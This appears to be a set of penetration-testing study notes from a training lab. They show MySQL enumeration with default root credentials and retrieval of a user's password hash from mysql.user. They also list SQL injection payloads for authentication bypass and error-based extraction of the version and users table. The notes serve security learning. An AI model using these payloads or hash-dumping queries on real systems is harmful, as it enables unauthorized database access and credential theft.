
```bash
# connect to a remote sql database
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

```sql
# look for version
MySQL [(none)]> select version();
+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (0.107 sec)

# look system user
# database-specific root user, not the the system-wide administrative root user

MySQL [(none)]> select system_user();
+--------------------+
| system_user()      |
+--------------------+
| root@192.168.20.50 |
+--------------------+
1 row in set (0.104 sec)
```

```sql
# display the databases
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

```sql
# reterive password
MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+--------+---------------------------------------------------------------------+
| user   | authentication_string                                               |
+--------+---------------------------------------------------------------------+
| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6      |
+--------+---------------------------------------------------------------------+
1 row in set (0.106 sec)

```

## Error based
```bash
# testing for sql injection bypass
offsec' OR 1=1 -- //
```

```bash
# Injected Sql statement
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```

```bash
# error based payload
' or 1=1 in (select @@version) -- //
```
**MySQL accepts both _version()_ and _@@version_ statements.**

```bash
# attampt to retrieve user table
' OR 1=1 in (SELECT * FROM users) -- //
```
